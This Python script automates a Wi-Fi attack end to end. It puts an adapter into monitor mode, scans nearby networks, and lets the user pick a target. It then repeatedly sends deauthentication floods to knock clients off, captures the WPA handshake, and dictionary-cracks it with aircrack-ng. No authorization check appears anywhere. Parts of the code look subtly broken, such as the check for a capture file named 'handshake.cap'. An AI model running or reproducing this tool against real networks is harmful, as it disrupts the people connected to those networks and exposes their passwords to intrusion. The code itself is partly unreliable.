import os
import subprocess
import time
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
WORDLIST = "wifyte.txt"  # Path to the wordlist file
TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
SCAN_DURATION = 12  # Total scanning duration in seconds
SCAN_INTERVAL = 3  # Interval between scans in seconds


def detect_wifi_adapter():
    print(Fore.CYAN + "[+] Detecting Wi-Fi adapter...")
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        adapters = [
            line.split()[0]
            for line in result.stdout.split("\n")
            if "IEEE 802.11" in line
        ]
        if not adapters:
            print(Fore.RED + "[-] No Wi-Fi adapter found that supports monitor mode.")
            sys.exit(1)
        print(Fore.GREEN + f"[+] Supported Wi-Fi adapters: {', '.join(adapters)}")
        return adapters[0]  # Select the first adapter
    except Exception as e:
        print(Fore.RED + f"[-] Failed to detect Wi-Fi adapter: {e}")
        sys.exit(1)


def enable_monitor_mode(interface):
    print(Fore.CYAN + f"[+] Enabling monitor mode on {interface}...")
    try:
        subprocess.run(["airmon-ng", "start", interface], check=True)
        return f"{interface}mon"
    except Exception as e:
        print(Fore.RED + f"[-] Failed to enable monitor mode: {e}")
        sys.exit(1)


def scan_networks(interface):
    networks = []
    print(
        Fore.CYAN
        + "[+] Scanning for available Wi-Fi networks... This will take 12 seconds."
    )

    # Perform scanning in intervals
    start_time = time.time()
    while time.time() - start_time < SCAN_DURATION:
        try:
            # Run airodump-ng to scan networks
            process = subprocess.Popen(
                ["airodump-ng", interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            # Allow time for scanning
            time.sleep(SCAN_INTERVAL)
            process.terminate()

            # Parse the output of airodump-ng
            output = process.stdout.read()
            lines = output.split("\n")
            temp_networks = []
            bssid_index = None
            ssid_index = None
            channel_index = None
            signal_index = None
            clients_index = None

            for line in lines:
                if "BSSID" in line:
                    # Find column indices
                    headers = line.split()
                    bssid_index = headers.index("BSSID")
                    ssid_index = headers.index("ESSID")
                    channel_index = headers.index("CH")
                    signal_index = headers.index("PWR")
                    clients_index = (
                        headers.index("STATION") if "STATION" in headers else None
                    )
                    continue

                if len(line.strip()) > 0 and "Station" not in line:
                    parts = line.split()
                    if (
                        len(parts)
                        < max(bssid_index, ssid_index, channel_index, signal_index) + 1
                    ):
                        continue
                    bssid = parts[bssid_index]
                    channel = parts[channel_index]
                    ssid = parts[ssid_index] if len(parts) > ssid_index else "<Hidden>"
                    signal = int(parts[signal_index])  # Signal strength in dBm
                    clients = (
                        parts[clients_index]
                        if clients_index and len(parts) > clients_index
                        else "0"
                    )
                    temp_networks.append(
                        {
                            "BSSID": bssid,
                            "Channel": channel,
                            "SSID": ssid,
                            "Signal": signal,
                            "Clients": clients,
                        }
                    )
            networks.clear()
            networks.extend(temp_networks)

        except Exception as e:
            print(Fore.RED + f"[-] Failed to scan networks: {e}")

    # Display the final list of networks
    print(Fore.CYAN + "[+] Available Wi-Fi networks:")
    if not networks:
        print(Fore.YELLOW + "[-] No networks detected. Please try again.")
        sys.exit(1)

    for i, network in enumerate(networks):
        signal_strength = abs(network["Signal"])
        if signal_strength <= 50:
            color = Fore.GREEN  # Strong signal
        elif 50 < signal_strength <= 70:
            color = Fore.YELLOW  # Moderate signal
        else:
            color = Fore.RED  # Weak signal
        print(
            f"{i + 1}. {color}SSID: {network['SSID']}, BSSID: {network['BSSID']}, Channel: {network['Channel']}, Signal: {network['Signal']} dBm, Clients: {network['Clients']}"
        )

    return networks


def deauth_attack(interface, bssid, channel):
    print(Fore.CYAN + f"[+] Performing deauthentication attack on BSSID: {bssid}...")
    try:
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface], check=True
        )
    except Exception as e:
        print(Fore.RED + f"[-] Failed to perform deauthentication attack: {e}")


def capture_handshake(interface, bssid, channel):
    print(Fore.CYAN + f"[+] Attempting to capture handshake from BSSID: {bssid}...")
    cap_file = "handshake.cap"
    start_time = time.time()

    while time.time() - start_time < TIMEOUT:
        # Run airodump-ng to capture handshake
        process = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid",
                bssid,
                "--channel",
                channel,
                "--write",
                "handshake",
                interface,
            ]
        )

        # Allow time to capture handshake
        time.sleep(10)
        process.terminate()

        # Check if handshake was successfully captured
        if os.path.exists(cap_file):
            print(Fore.GREEN + "[+] Handshake successfully captured!")
            return cap_file

        # Perform deauthentication again if handshake is not captured
        deauth_attack(interface, bssid, channel)

    print(Fore.RED + "[-] Failed to capture handshake after 3 minutes.")
    return None


def crack_handshake(cap_file, wordlist, target_bssid):
    print(Fore.CYAN + f"[+] Starting cracking process using wordlist: {wordlist}...")
    try:
        with open(wordlist, "r", encoding="latin-1") as f:
            passwords = f.readlines()

        total_passwords = len(passwords)
        print(Fore.CYAN + f"[+] Total passwords to test: {total_passwords}")

        for i, password in enumerate(passwords, start=1):
            password = password.strip()
            result = subprocess.run(
                [
                    "aircrack-ng",
                    "-w",
                    "-",  # Read password from stdin
                    "-b",
                    target_bssid,  # Use the selected BSSID
                    cap_file,
                ],
                input=password.encode(),
                capture_output=True,
                text=True,
            )

            if "KEY FOUND!" in result.stdout:
                print(Fore.GREEN + f"[+] Password successfully cracked: {password}")
                return True

        print(Fore.RED + "[-] Password not found.")
        return False
    except Exception as e:
        print(Fore.RED + f"[-] Failed to crack handshake: {e}")
        return False


def disable_monitor_mode(interface):
    print(Fore.CYAN + f"[+] Disabling monitor mode on {interface}...")
    try:
        subprocess.run(["airmon-ng", "stop", interface], check=True)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to disable monitor mode: {e}")


def main():
    # Step 1: Detect Wi-Fi adapter
    adapter = detect_wifi_adapter()

    # Step 2: Enable monitor mode
    monitor_interface = enable_monitor_mode(adapter)

    try:
        # Step 3: Scan for Wi-Fi networks
        networks = scan_networks(monitor_interface)

        # Step 4: Select target network
        choice = (
            int(
                input(
                    Fore.CYAN + "[+] Enter the number of the network you want to test: "
                )
            )
            - 1
        )
        if choice < 0 or choice >= len(networks):
            print(Fore.RED + "[-] Invalid selection.")
            sys.exit(1)

        target = networks[choice]
        TARGET_BSSID = target["BSSID"]  # Define TARGET_BSSID here
        print(
            Fore.CYAN
            + f"[+] Target selected: SSID: {target['SSID']}, BSSID: {TARGET_BSSID}, Channel: {target['Channel']}"
        )

        # Step 5: Capture handshake
        cap_file = capture_handshake(monitor_interface, TARGET_BSSID, target["Channel"])
        if not cap_file:
            print(Fore.RED + "[-] Test failed. No handshake captured.")
            sys.exit(1)

        # Step 6: Crack handshake
        success = crack_handshake(cap_file, WORDLIST, TARGET_BSSID)
        if not success:
            print(Fore.RED + "[-] Cracking failed. Password not found.")

    finally:
        # Step 7: Disable monitor mode or exit
        choice = input(
            Fore.CYAN + "[+] Do you want to disable monitor mode? (y/n): "
        ).lower()
        if choice == "y":
            disable_monitor_mode(monitor_interface)
        print(Fore.CYAN + "[+] Program finished.")


if __name__ == "__main__":
    main()
